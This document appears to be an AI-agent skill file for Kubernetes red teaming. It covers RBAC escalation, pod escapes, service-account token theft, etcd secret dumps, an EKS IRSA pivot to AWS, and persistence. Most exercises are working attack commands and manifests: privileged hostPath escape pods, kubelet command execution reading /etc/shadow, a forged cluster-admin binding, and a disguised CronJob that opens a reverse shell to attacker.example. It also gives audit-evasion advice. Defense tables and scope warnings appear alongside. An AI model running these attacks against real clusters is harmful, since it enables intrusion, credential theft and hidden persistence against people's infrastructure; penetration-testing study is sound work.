---
name: kubernetes-attack
description: Kubernetes cluster attack and red team covering RBAC abuse, pod escape, service account theft, API server exploitation, etcd attacks, supply chain (image/admission controller), and cloud-managed K8s (EKS/GKE/AKS) pivoting using kubectl, CDK, peirates, kube-hunter, kubescape, stratus-red-team, and kubernetes-goat.
origin: github-trending-2026
version: 0.1.29
compatibility: ">=0.1.29"
allowed-tools:
  - Bash
  - Read
  - Write
  - Edit
  - Glob
  - Grep
  - WebFetch
metadata:
  domain: cloud-native
  tool_count: 14
  guide_count: 1
  mitre: "TA0008-Lateral Movement (containers), maps to MITRE ATT&CK for Containers"
---




# Skill: Kubernetes Attack

> **Supplementary Files**:
> - `payloads.md` — Command catalogue for kubectl, CDK, peirates, kube-hunter, kubescape, stratus-red-team, kube-bench, plus exploit recipes for RBAC abuse, pod escape, SA token theft, etcd dump, admission controller bypass, image poisoning, network policy evasion, EKS/GKE/AKS IAM pivot, persistence, and audit-log evasion — 13 sections with real kubectl flags and CVE references.
> - `test-cases.md` — Structured test cases (cluster recon, RBAC self-subject review, SA token dump, hostPath escape, kubelet RCE, etcd secret dump, anonymous API, admission webhook bypass, poisoned image, network policy bypass, IRSA pivot, malicious DaemonSet persistence) — 12 cases across 6 categories.
> - `guides/kubernetes-attack-playbook.md` — End-to-end red team playbook: scoping → recon → API discovery → RBAC abuse → pod escape → lateral movement → cloud IAM pivot → persistence → detection evasion. Includes pre-engagement checklist, MITRE ATT&CK for Containers matrix, and report template.

## Summary

Kubernetes attack skill domain covering cluster reconnaissance, RBAC privilege escalation, pod-to-host escape, service account token theft, API server exploitation, etcd attacks, supply chain (image and admission controller), and cloud-managed K8s (EKS/GKE/AKS) IAM pivoting.

**Tools**: kubectl, CDK (Container penetration Toolkit), peirates, kube-hunter, kubescape, stratus-red-team, kubernetes-goat, kube-bench, kubeaudit, kubeletctl, dive, trivy, cosign, falco

**Domain**: cloud-native

**MITRE ATT&CK**: TA0008-Lateral Movement (containers), maps to MITRE ATT&CK for Containers matrix

## Description

Kubernetes has become the dominant container orchestration platform, and with that dominance came a new attack surface that doesn't map cleanly onto traditional host, network, or application security. A K8s cluster is a control plane (API server, etcd, scheduler, controller-manager) plus a data plane (kubelet, container runtime, pods). Breaking the cluster almost never means popping a shell on a node — it means abusing the API to escalate privileges, steal a service account token, escape a pod to the host, or pivot from a compromised pod into the underlying cloud IAM role.

This skill covers the seven things that distinguish K8s attacks from generic Linux/container exploitation:

1. **The API server is the crown jewel** — every cluster action flows through `kube-apiserver`. Whoever controls an authorized token (or an unauthenticated endpoint) controls the cluster. CVE-2018-1002105 let unauthenticated attackers escalate to admin via a malicious HTTP/2 connection; the same conceptual class of bug recurs every release cycle.
2. **RBAC is the new IAM — and is almost always wrong** — `ClusterRoleBinding` to `cluster-admin`, default ServiceAccounts reused across pods, verbs like `*` on resources like `*`. A single misconfigured `Role` is the difference between "we found a webapp bug" and "we took over the cluster."
3. **ServiceAccount tokens are bearer credentials** — pre-1.24, every pod had a long-lived SA token mounted at `/var/run/secrets/kubernetes.io/serviceaccount/token`. Post-1.24 tokens are projected and short-lived, but the mounted path is the same and the token still grants whatever RBAC the SA has. Steal it from inside a pod → forge it → act as that SA from anywhere.
4. **Pods are not the security boundary everyone thinks** — `hostPath`, `hostPID`, `hostNetwork`, `privileged: true`, `CAP_SYS_ADMIN`, mounted docker.sock, mounted `/proc` — each of these is a documented, supported escape path to the node. Pod Security Admission (PSA) replaced the deprecated PSP in 1.25, but default policy is still permissive in most clusters.
5. **etcd is the source of truth, not the API server** — every Secret, every ConfigMap, every RBAC binding lives in etcd. Anyone with etcd client certs (or direct network access to port 2379) can read or write anything, including forging a `cluster-admin` binding. The k8s docs say "etcd keyspace is the keys to the kingdom"; they mean it.
6. **Cloud-managed K8s hands you a cloud IAM pivot for free** — EKS IRSA, GKE Workload Identity, AKS Managed Identity all bind a Kubernetes SA to a cloud role. Compromise the pod → exfiltrate the cloud token → call `aws sts get-caller-identity` → you're now in the cloud account, not just the cluster.
7. **Supply chain dominates the long tail** — admission controllers are the last line of defense against poisoned images, but `imagePullPolicy: Always` plus an unsigned tag plus a permissive `MutatingWebhookConfiguration` equals a persistent backdoor. cosign + Kyverno + OPA Gatekeeper exist for a reason.

**Difference from `cloud-security`**: Cloud-security covers the cloud provider control plane (AWS IAM, S3, IMDS, Azure AD). Kubernetes-attack covers what happens *after* you land inside a pod or compromise the API server, including the pivot path from K8s SA back into cloud IAM.

**Difference from `container-security`**: Container-security covers image scanning, runtime escape mechanics (cgroups, namespaces), and Docker daemon abuse. Kubernetes-attack covers the orchestration layer on top — RBAC, API server, etcd, admission, and the cluster's own control plane.

**Difference from `post-exploitation`**: Post-exploitation covers general host-level privilege escalation and persistence on Linux. Kubernetes-attack uses pods and the API server as the persistence and lateral movement medium — DaemonSets, CronJobs, and malicious operators instead of crontab and SSH keys.

**Difference from `supply-chain-security`**: Supply-chain covers package/dependency provenance for code. Kubernetes-attack covers image provenance, admission controller abuse, and registry poisoning — the deploy-time supply chain.

**Difference from `privilege-escalation`**: Privilege-escalation covers host-level privesc (sudo, SUID, kernel). Kubernetes-attack covers Kubernetes-specific privesc: RBAC verb/resource escalation, pod security policy bypass, kubelet certificate signing abuse.

## Use Cases

- **Pre-engagement cluster audit**: Given a kubeconfig or a foothold in a single pod, enumerate the cluster, find RBAC over-privilege, and document every path to `cluster-admin` before an adversary does.
- **Red team cluster compromise**: Starting from an exposed kubelet port or a leaked kubeconfig, chain API discovery → anonymous auth → RBAC escalation → secret exfiltration → cross-namespace lateral → etcd dump → full cluster takeover.
- **Pod escape verification**: Verify whether a specific pod's `securityContext`, volume mounts, capabilities, or a kernel CVE (CVE-2022-0185 heap overflow in `fs/context`, CVE-2023-2640 / CVE-2023-32629 OverlayFS `pipeio`) can be leveraged to escape to the node.
- **Cloud-managed K8s IAM pivot**: From a compromised pod in EKS/GKE/AKS, exfiltrate the bound cloud role credentials (IRSA, Workload Identity, Managed Identity) and pivot into the cloud account — turning a single RCE into cloud account compromise.
- **Service account token theft and replay**: Extract the mounted SA token from a pod, replay it from an external host, and demonstrate that the bearer token alone — without any other foothold — grants the SA's full RBAC.
- **etcd direct-access exploitation**: When network policy or firewall misconfiguration exposes etcd (port 2379) to a compromised network position, read all Secrets directly and forge `cluster-admin` bindings.
- **Admission controller bypass and abuse**: Identify permissive `MutatingWebhookConfiguration` or `ValidatingWebhookConfiguration`, bypass a weak OPA Gatekeeper policy, or exploit a vulnerable admission webhook for code execution.
- **Supply chain attack via poisoned image**: Build a backdoored base image, push it to a registry the cluster pulls from, and demonstrate persistent access via `imagePullPolicy: Always` plus a tag that drifts to the attacker's image.
- **Detection evasion on a hardened cluster**: Operate inside a cluster that has audit logging + Falco + Hubble enabled — use existing SA tokens, avoid API calls that audit-log, and pick escape paths that Falco doesn't rule on.
- **Disaster recovery drill validation**: As a defender exercise, simulate cluster compromise (kube-hunter + manual chaining) to validate that detection, response runbooks, and token rotation procedures actually work under pressure.

## Core Tools

### Cluster Reconnaissance & Discovery

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **kubectl** | The universal cluster CLI — enumerate, create, exec, apply | `kubectl auth can-i --list --as=system:anonymous` |
| **kube-hunter** (Aqua) | Active hunter that fingerprints a cluster and reports known weakness | `kube-hunter --remote <api-server> --active` |
| **kubescape** (11k stars) | NSA/CIS/K8s best-practice scanner — 100+ controls | `kubescape scan framework nsa --submit` |
| **kube-bench** (8k stars) | CIS Kubernetes Benchmark automated checker | `kube-bench --benchmark cis-1.10 run` |
| **kubeaudit** | Audit K8s security configuration (RBAC, Pod Security, secrets) | `kubeaudit all -n kube-system -f yaml` |

### Exploitation & Escape

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **CDK** (4.7k stars) | Container penetration toolkit — escape, scan, exploit, probe | `cdk evaluate --full` / `cdk kcurl escape <svc>` |
| **peirates** | K8s pentest tool — built around a menu of attack primitives | `peirates` (interactive: option 1 = list SA tokens, 6 = exec in pod) |
| **kubeletctl** | Kubelet API client — list pods, run commands, read logs | `kubeletctl pods -s <node-ip>` / `kubeletctl exec -s <node> -p <pod> -c <ctn> "id"` |
| **kubernetes-goat** (5.7k stars) | Intentionally vulnerable K8s cluster for training | `kubectl apply -f setup/single-cluster-scenario-1-5.yaml` |

### Detection & Defense Validation

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **stratus-red-team** (2.3k stars) | Emulates real adversary techniques (incl. container/K8s TTPs) | `stratus detonate k8s.audit-log-bomb` |
| **Hubble** (4.2k stars) | eBPF network observability — for validating network policy | `hubble observe -f --from-pod default/shell` |
| **falco** | Runtime detection — syscalls, container escapes, K8s audit | `falco -r rules/k8s_audit_rules.yaml` |

### Supply Chain

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **trivy** | Image + IaC + K8s manifest scanner | `trivy image nginx:1.25` / `trivy k8s cluster --report summary` |
| **cosign** (Sigstore) | Sign and verify container images | `cosign verify --key cosign.pub myrepo/app:v1` |
| **dive** | Image layer inspector — find secrets in layers | `dive myrepo/app:v1` |

## Methodology

### K8s Red Team Six-Phase Workflow

```
Phase 1           Phase 2           Phase 3           Phase 4           Phase 5           Phase 6
Recon &          → API Discovery → RBAC Abuse     → Pod Escape     → Lateral +      → Persistence +
Foothold          + Auth Bypass     + Priv Esc       + Runtime Esc    Cloud IAM Pivot  Detection Evasion
   │                  │                  │                  │                  │                  │
   ▼                  ▼                  ▼                  ▼                  ▼                  ▼
 Exposed kubelet,  Anonymous auth,     self-subject      hostPath/privileged, DaemonSets,        CronJobs,
 leaked kubeconfig, CVE-2018-1002105,  review, verb      hostPID, hostNetwork, cross-namespace   backdoored
 RCE in pod        open port 6443/    escalation,       docker.sock mount,  exec, etcd dump,   operators,
                   10250, RBAC IaC    TokenRequest,     kernel CVE         IRSA/Workload      image tag drift,
                   scan (kubescape)   Pod create        (CVE-2022-0185)    Identity token     webhook abuse
```

**Phase 1: Recon & Foothold** — Identify the entry vector. Exposed kubelet (`10250/tcp`), exposed API server (`6443/tcp`) accepting anonymous auth, leaked kubeconfig in a CI log or git repo, SSRF that reaches the in-cluster metadata, or an RCE in an application pod. Tools: `nmap`, `kubectl`, `kube-hunter`.

**Phase 2: API Discovery + Auth Bypass** — From the foothold, discover the API server, enumerate endpoints, test for anonymous access (`kubectl auth can-i --list --as=system:anonymous`), check for `--anonymous-auth=true` + permissive `system:anonymous`/`system:unauthenticated` RBAC, and identify CVEs (CVE-2018-1002105 API server privilege escalation, CVE-2019-11253 YAML bomb DoS, CVE-2020-8554 MITM on external IPs).

**Phase 3: RBAC Abuse + Privilege Escalation** — Given any token, run `kubectl auth can-i --list` to enumerate what the SA can do. Classic escalations: `pods/exec` (get a shell anywhere), `pods` + `create` (mount a node's root filesystem via hostPath), `serviceaccounts/token` (forge tokens for any SA), `secrets` (read all cluster secrets), `certificatesigningrequests` (sign a client cert as any user). Kubescape and kube-bench flag the underlying misconfigurations.

**Phase 4: Pod Escape + Runtime Escape** — From a pod with permissive `securityContext`, escape to the node: `hostPath` mount of `/`, `privileged: true` + `nsenter`, `hostPID` + access another container's namespace, `hostNetwork` + ARP spoofing, mounted `/var/run/docker.sock` + spawn a privileged container, or kernel CVE (CVE-2022-0185 heap overflow in `fs/context`, CVE-2023-2640 / CVE-2023-32629 OverlayFS, CVE-2024-1086 netfilter UAF). CDK automates most of these checks via `cdk evaluate --full`.

**Phase 5: Lateral Movement + Cloud IAM Pivot** — Once on a node or in a privileged pod, move laterally: read all Secrets via etcd or the API, exec into other namespaces' pods, dump cloud IAM credentials via IMDS (AWS) or metadata (GCP/Azure). EKS IRSA: read the SA annotation `eks.amazonaws.com/role-arn`, exfiltrate the token from `AWS_WEB_IDENTITY_TOKEN_FILE`, call `aws sts assume-role-with-web-identity`. GKE Workload Identity: read the metadata server. AKS: read the Managed Identity token from IMDS.

**Phase 6: Persistence + Detection Evasion** — Establish long-term access and stay quiet. Persistence: malicious DaemonSet, CronJob running a reverse shell, mutating webhook that injects a sidecar, image tag drift (`image: myrepo/app:latest` pulled fresh with backdoor). Evasion: reuse existing SA tokens (no API audit), avoid `pods/exec` (Falco rule), use `kubectl auth can-i` instead of `kubectl get` where possible, throttle volume to stay under Hubble sampling.

### Quick Selection Guide

| Scenario | Primary Approach | Alternative |
|----------|------------------|-------------|
| Exposed kubelet on `10250` | `kubeletctl run "cat /etc/shadow"` across all pods | `cdk kcurl evade` |
| Anonymous API server | `kubectl auth can-i --list --as=system:anonymous` | direct curl to `/api/v1` |
| Misconfigured RBAC | `kubectl auth can-i --list` + manual escalation chain | `peirates` menu option 7 |
| Pod with `hostPath: /` | `chroot /host` from inside the pod | `cdk run mount-disk` |
| Pod with `privileged: true` | `nsenter --target 1 --mount -- bash` | `cdk run escape-docker.sock` if docker.sock also mounted |
| Need to forge a SA token | `kubectl create token <sa>` (1.24+, requires `serviceaccounts/token`) | steal mounted token from `/var/run/secrets/...` |
| Direct etcd network access | `ETCDCTL_API=3 etcdctl --endpoints=... --cert=... get / --prefix` | dump the etcd data dir from the host |
| Suspicious webhook | `kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o yaml` | curl the webhook service to see what it does |
| Cloud IAM pivot (EKS) | `AWS_ROLE_ARN=...; aws sts assume-role-with-web-identity --web-identity-token $(cat $AWS_WEB_IDENTITY_TOKEN_FILE) --role-arn $AWS_ROLE_ARN --role-session-name x` | Pacu `iam__enum_permissions` after export |
| Defense validation | `stratus detonate aws.exfiltration.ec2-share-ami` / `k8s.audit-log-bomb` | manual `kubectl auth can-i` enumeration |
| Image supply chain | `trivy image` + `cosign verify` + `dive` | `grype` for SBOM |
| Network policy validation | `hubble observe --from-pod A --to-pod B` | `kubectl exec` + `nc` / `curl` |

### Defense Perspective

| Defense Measure | Description |
|-----------------|-------------|
| **Pod Security Admission (PSA)** | Enforce `restricted` policy on all namespaces. Replaces the deprecated PodSecurityPolicy (PSP, removed in 1.25). Blocks `privileged`, `hostPath`, `hostPID`, `hostNetwork`, added caps, root UID 0. |
| **RBAC least privilege** | Audit every binding with `kubectl auth can-i --list`; ban `cluster-admin` for non-admin SAs; use `kubectl-who-can` to find over-privileged subjects. Kubescape control NS-1.1..1.3. |
| **Network policies** | Default-deny ingress + egress in every namespace. Use Calico or Cilium. Hubble verifies the policies are actually enforced. |
| **API server hardening** | `--anonymous-auth=false`, `--authorization-mode=Node,RBAC` (never `AlwaysAllow`), `--enable-admission-plugins=NodeRestriction,ServiceAccount,ValidatingAdmissionWebhook,MutatingAdmissionWebhook`, `--audit-log-maxage=30`. |
| **etcd encryption at rest + TLS** | `--encryption-provider-config` with a KMS-backed provider; etcd reachable only from control plane nodes; client cert auth required. |
| **Audit logging at Metadata level** | `--audit-policy-file` that logs all Secret access, all `pods/exec`, all RBAC changes. Ship to SIEM; alert on `system:anonymous` and on new `cluster-admin` bindings. |
| **Image signing + admission** | cosign-sign every image; Kyverno or OPA Gatekeeper policy that rejects unsigned images; pin images by digest, never by tag. |
| **SA token rotation** | 1.24+ bound tokens are short-lived and rotated automatically; for legacy long-lived tokens, rotate every 90 days. Bound tokens are auditable via `TokenRequest`. |
| **Runtime detection (Falco)** | Rules for: shell in container, `nsenter`, write under `/etc`, `/proc/sysrq-trigger`, unexpected outbound connection, `kubectl` binary inside container. |
| **Cloud IAM scope** | Bound cloud role has minimal permissions — not the entire account. IRSA role trust policy limits `StringEquals` on the SA name and namespace. |

## Practical Steps

> **Detailed payloads in `payloads.md`, complete test checklist in `test-cases.md`.**

### Exercise 1: Cluster Reconnaissance from Inside a Pod

Goal: starting from RCE in a single pod, map the cluster.

```bash
# 1. Read the mounted SA token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 2. Discover the API server from env / DNS
env | grep KUBERNETES
nslookup kubernetes.default.svc
cat /etc/resolv.conf

# 3. From inside the pod, hit the API with the mounted token
APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

curl -s --cacert $CACERT --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods | jq -r '.items[].metadata.name'

# 4. Enumerate RBAC for this SA
curl -s --cacert $CACERT --header "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -H 'Content-Type: application/json' \
  -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"'$NAMESPACE'"}}' \
  | jq '.status.resourceRuleInfos[] | {verbs, resources}'

# 5. Or, equivalently, with kubectl if installed
kubectl auth can-i --list
```

### Exercise 2: RBAC Privilege Escalation Chains

Goal: take a low-privileged SA and chain to `cluster-admin`.

```bash
# Pattern A: "pods create" → mount hostPath / → chroot to host
cat > pwn.yaml <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: pwn
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: pwn
    image: alpine
    command: ["nsenter", "--target", "1", "--mount", "--", "sh"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath: { path: / }
  hostNetwork: true
EOF
kubectl apply -f pwn.yaml
kubectl exec pwn -- chroot /host bash

# Pattern B: "serviceaccounts/token" → forge any SA's token (1.24+)
kubectl create token -n kube-system default          # forge kube-system:default
kubectl create token -n kube-system system:masters   # may be permitted if verb=* on serviceaccounts/token

# Pattern C: "certificatesigningrequests create" → sign a client cert as anyone
cat > csr.yaml <<EOF
apiVersion: certificates.k8s.io/v1
kind: CertificateSigningRequest
metadata: { name: pwn }
spec:
  signerName: kubernetes.io/kube-apiserver-client
  request: $(openssl req -new -key sa.key -out csr.pem -subj "/CN=system:masters" 2>/dev/null && base64 csr.pem | tr -d '\n')
  usages: [client auth]
EOF
kubectl apply -f csr.yaml
kubectl certificate approve pwn

# Pattern D: "secrets list/get" in kube-system → pull the default token
kubectl get secrets -n kube-system
kubectl get secret default-token-xxxxx -n kube-system -o jsonpath='{.data.token}' | base64 -d

# Pattern E: "pods/exec" → shell in any pod in any namespace you can list
kubectl exec -n kube-system apiserver-pod -c apiserver -- /bin/sh
```

### Exercise 3: Pod Escape via hostPath / privileged

Goal: prove a pod's `securityContext` is exploitable.

```bash
# Use CDK's full evaluator — checks every escape primitive
cdk evaluate --full

# Manual: privileged + hostPID → nsenter into PID 1's mount namespace
kubectl run pwn --rm -it --restart=Never --image=alpine \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"pwn","image":"alpine","command":["nsenter","--target","1","--mount","--","sh"],"securityContext":{"privileged":true}}]}}' \
  -- bash

# Manual: hostPath / mount → chroot
kubectl run pwn --rm -it --restart=Never --image=alpine \
  --overrides='{"spec":{"volumes":[{"name":"h","hostPath":{"path":"/"}}],"containers":[{"name":"pwn","image":"alpine","command":["sh"],"volumeMounts":[{"name":"h","mountPath":"/host"}],"securityContext":{"privileged":true}}]}}'

# Inside the pod:
chroot /host bash
# You are now root on the node.

# Manual: docker.sock mount → spawn a privileged container on the host
ls -la /var/run/docker.sock
docker run -it --privileged --net=host --pid=host -v /:/host alpine chroot /host sh
```

### Exercise 4: Kubelet API Abuse (port 10250)

Goal: enumerate and exploit an exposed kubelet port.

```bash
# Anonymous kubelet — many clusters misconfigure --anonymous-auth=true on the kubelet
curl -sk https://<node-ip>:10250/pods | jq '.items[].metadata.name'

# List pods running on a specific node
kubeletctl pods -s <node-ip>

# Execute a command in a pod via the kubelet — bypasses RBAC if anonymous kubelet is on
kubeletctl exec -s <node-ip> -p <pod-name> -c <container-name> "cat /etc/shadow"

# CDK's kubelet exploit primitive
cdk kcurl evade https://<node-ip>:10250/pods
```

### Exercise 5: etcd Direct-Access Secret Dump

Goal: when etcd is reachable, dump everything.

```bash
# Requires etcd client certs OR unauthenticated etcd (rare but devastating)
export ETCDCTL_API=3
etcdctl --endpoints=https://<etcd-ip>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | head

# Dump every Secret in the cluster
etcdctl --endpoints=... get /registry/secrets --prefix | less

# Forge a cluster-admin binding
cat > admin.yaml <<EOF
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata: { name: pwn-admin }
subjects: [{ kind: User, name: system:anonymous }]
roleRef: { kind: ClusterRole, name: cluster-admin, apiGroup: rbac.authorization.k8s.io }
EOF
# Encode as JSON and write directly into etcd:
# key: /registry/clusterrolebindings/pwn-admin
# value: <base64 of yaml-as-json>
```

### Exercise 6: EKS IRSA Pivot to AWS

Goal: from a pod in EKS, get AWS credentials and call the cloud API.

```bash
# 1. Read the IRSA env vars
env | grep AWS
# AWS_ROLE_ARN=arn:aws:iam::111122223333:role/my-app-role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# 2. Exchange the web-identity token for AWS STS credentials
aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name pwn \
  --web-identity-token $(cat $AWS_WEB_IDENTITY_TOKEN_FILE) \
  --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' \
  --output text

# 3. Use the credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
# Pivot complete — you are now operating as the IAM role in the AWS account.
```

### Exercise 7: Admission Controller Discovery and Bypass

Goal: find permissive webhooks and identify bypass paths.

```bash
# Enumerate webhooks
kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o yaml

# Each webhook has a `namespaceSelector` and an `objectSelector` — these can be bypassed
# if they use matchExpressions that the attacker controls. E.g.:
#   namespaceSelector:
#     matchExpressions:
#       - key: environment
#         operator: In
#         values: ["production"]
# → attacker creates a pod in a namespace without that label → webhook skipped.

# Find the webhook service and inspect it directly
kubectl get svc -n <webhook-ns>
kubectl port-forward -n <webhook-ns> svc/<webhook-svc> 8443:443
curl -sk https://localhost:8443/validate -d '{}'

# If the webhook is in fail-open mode (failurePolicy: Ignore) and the webhook service is down,
# any pod creation will skip validation entirely.
```

### Exercise 8: Persistence via DaemonSet + CronJob

Goal: maintain access even after the initial foothold is removed.

```bash
# DaemonSet — runs on every node, including new ones
cat > backdoor-daemonset.yaml <<EOF
apiVersion: apps/v1
kind: DaemonSet
metadata: { name: kube-cache, namespace: kube-system }
spec:
  selector: { matchLabels: { app: kube-cache } }
  template:
    metadata: { labels: { app: kube-cache } }
    spec:
      hostNetwork: true
      hostPID: true
      containers:
      - name: cache
        image: myregistry/kube-cache:latest
        securityContext: { privileged: true }
        volumeMounts:
        - { name: host, mountPath: /host }
      volumes:
      - { name: host, hostPath: { path: / } }
EOF
kubectl apply -f backdoor-daemonset.yaml

# CronJob — periodic reverse shell, blends in with normal cron workloads
cat > backdoor-cron.yaml <<EOF
apiVersion: batch/v1
kind: CronJob
metadata: { name: metrics-collector, namespace: kube-system }
spec:
  schedule: "*/15 * * * *"
  jobTemplate:
    spec:
      template:
        spec:
          containers:
          - name: collector
            image: busybox
            command: ["/bin/sh", "-c", "nc -e /bin/sh attacker.example 4444"]
          restartPolicy: OnFailure
EOF
kubectl apply -f backdoor-cron.yaml
```

## Common Pitfalls

- **Trusting the mounted SA token's RBAC at face value**: `kubectl auth can-i --list` from inside a pod shows what the *default* SA can do. The default SA has minimal permissions in a well-configured cluster, but the application may use a *different* SA — read the pod's `spec.serviceAccountName` and re-run `can-i` against that SA's token.
- **Forgetting 1.24+ bound SA tokens are short-lived**: pre-1.24 tokens never expired and could be replayed forever. 1.24+ projected tokens are bound to the pod and rotate; exfiltrating one only buys you minutes-to-hours. Plan your actions around the token lifetime, or use `serviceaccounts/token` (if your RBAC permits) to forge fresh ones.
- **Treating PSA as a silver bullet**: Pod Security Admission defaults to `warn` mode in most clusters, not `enforce`. A pod that violates the `restricted` policy still gets created — you just see a warning. Verify with `kubectl get ns -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.annotations.kubernetes\.io\/psa}{"\n"}{end}'` and check `enforce` not `warn`.
- **Ignoring the cloud IAM layer under managed K8s**: EKS/GKE/AKS are managed control planes, but the *pods* still get cloud IAM credentials via IRSA/Workload Identity/Managed Identity. A complete cluster compromise is rarely just "I have the cluster" — it's "I have the cluster AND the cloud role bound to every app in it."
- **Pulling images by tag instead of digest**: `image: nginx:latest` can drift to a malicious image at any time. Always pin `image: nginx@sha256:abc123...` for anything that matters. cosign-sign and verify in admission.

## Safety Notes

- **Multi-tenant clusters**: pod escape in a multi-tenant cluster affects every tenant on the node. Verify the engagement scope explicitly authorizes escape attempts, and coordinate with the cluster ops team for a maintenance window.
- **Production clusters**: any action that creates pods, modifies RBAC, or restarts components has blast radius. Prefer read-only enumeration in prod; do active exploitation in a clone of the cluster.
- **etcd writes are forever**: a forged `ClusterRoleBinding` written to etcd persists across API server restarts and even cluster upgrades. Document every write and have a tested rollback path.
- **Cloud IAM pivots cross account boundaries**: assuming an AWS role from a compromised pod is no longer "the K8s engagement" — it's now a cloud account engagement under a different ruleset and likely a different contractual scope. Stop and reconfirm scope before crossing that line.
- **Token exfiltration**: a stolen SA token, once it leaves the cluster, is a credential. Store it as a secret, rotate it post-engagement, and never commit it to git (even in a private report repo).
- **Audit log footprint**: every API call is logged at Metadata level in most production clusters. Assume your actions are visible; plan your detection-evasion strategy in advance and disclose what you did in the final report.

## Hacker Laws

- **Trust but Verify** — A kubeconfig from a CI log is not proof of live access. The cluster may have been torn down, the cert may have expired, the SA may have been rotated. Verify with `kubectl auth can-i --list` before treating the foothold as real.
- **Defense in Depth** — Pod Security Admission alone does not stop escape. Layer PSA + RBAC least-privilege + network policies + admission webhooks + Falco runtime detection + audit logging + image signing. No single layer can be trusted as the sole defense.
- **Assume Breach** — Design monitoring systems assuming a pod has already been compromised. Falco detects the shell, the hostPath mount, the unexpected outbound connection; audit logs capture the RBAC change; Hubble shows the lateral network move.
- **Least Privilege** — A pod should not mount hostPath, should not run as root, should not have CAP_SYS_ADMIN, should not be privileged, should not share the host's PID/network namespaces. Every unnecessary permission is an escape vector.
- **Supply Chain Trust** — Every image in the cluster is trusted transitively from its base image, through every build step, through the registry, through the admission controller, to runtime. Unsigned images pulled by tag are an open backdoor.
- **Minimize Attack Surface** — Disable the kubelet anonymous endpoint, the API server anonymous auth, the insecure port 8080 (gone in 1.24+, but verify legacy clusters). Every disabled feature is one fewer entry point.
- **Information Wants to Be Free** — Secrets in etcd are stored base64-encoded, not encrypted (unless encryption-at-rest is configured). Anyone with etcd access reads every Secret. Anyone with a SA token that can `get secrets` reads every Secret.
- **Weakest Link Is Human** — Most cluster compromises start with a leaked kubeconfig, an over-privileged Helm chart, or an unsecured CI pipeline — not a crypto bug in the API server. Audit the humans and the pipeline, not just the cluster config.

## Cross-References

- **`skills/cloud-security/SKILL.md`** — AWS/Azure/GCP control plane attacks, IAM enumeration, IMDS abuse. The pivot destination for any cloud-managed K8s engagement.
- **`skills/container-security/SKILL.md`** — Image scanning (trivy/grype), runtime escape mechanics (cgroups, namespaces, kernel CVEs), docker-bench / kube-bench baselines.
- **`skills/post-exploitation/SKILL.md`** — Host-level post-exploitation once you've escaped a pod to the node. Covers sudo/SUID/kernel privesc on the node.
- **`skills/privilege-escalation/SKILL.md`** — Host privesc on the node post-escape. Overlaps with container-security on kernel CVEs.
- **`skills/supply-chain-security/SKILL.md`** — Dependency/package provenance for code. Kubernetes-attack covers the deploy-time supply chain (images, admission, registry) which is adjacent.
- **`skills/lateral-movement/SKILL.md`** — General lateral movement across a network. K8s-specific lateral (cross-namespace exec, etcd dump) is here.
- **`skills/anti-forensics/SKILL.md`** — Cleaning up the DaemonSet, CronJob, forged RBAC binding, and audit log entries post-engagement.
- **`skills/pentest-reporting/SKILL.md`** — Structuring the engagement deliverable with the K8s attack chain as the narrative spine.
- **`skills/digital-forensics/SKILL.md`** — Defender-side analysis of audit logs, Falco events, and Hubble flows when responding to a real cluster compromise.

## Learning Resources

- **This skill's supplementary files**: `payloads.md`, `test-cases.md`
- **Deep-dive guide**: `guides/kubernetes-attack-playbook.md` — end-to-end red team workflow with MITRE ATT&CK for Containers mapping, RBAC escalation playbook, pod escape decision tree, cloud IAM pivot procedures, and report structure.
- **Reference repositories** (the inspirations for this skill):
  - kubescape (11k stars): [github.com/kubescape/kubescape](https://github.com/kubescape/kubescape) — NSA/CIS/K8s best-practice scanner
  - CDK (4.7k stars): [github.com/cdk-team/CDK](https://github.com/cdk-team/CDK) — container penetration toolkit
  - kube-hunter (5k stars): [github.com/aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter) — active cluster hunter
  - stratus-red-team (2.3k stars): [github.com/DataDog/stratus-red-team](https://github.com/DataDog/stratus-red-team) — adversary emulation
  - kubernetes-goat (5.7k stars): [github.com/madhuakula/kubernetes-goat](https://github.com/madhuakula/kubernetes-goat) — vulnerable cluster lab
  - peirates: [github.com/inguardians/peirates](https://github.com/inguardians/peirates) — K8s pentest tool
  - Hubble (4.2k stars): [github.com/cilium/hubble](https://github.com/cilium/hubble) — eBPF network observability
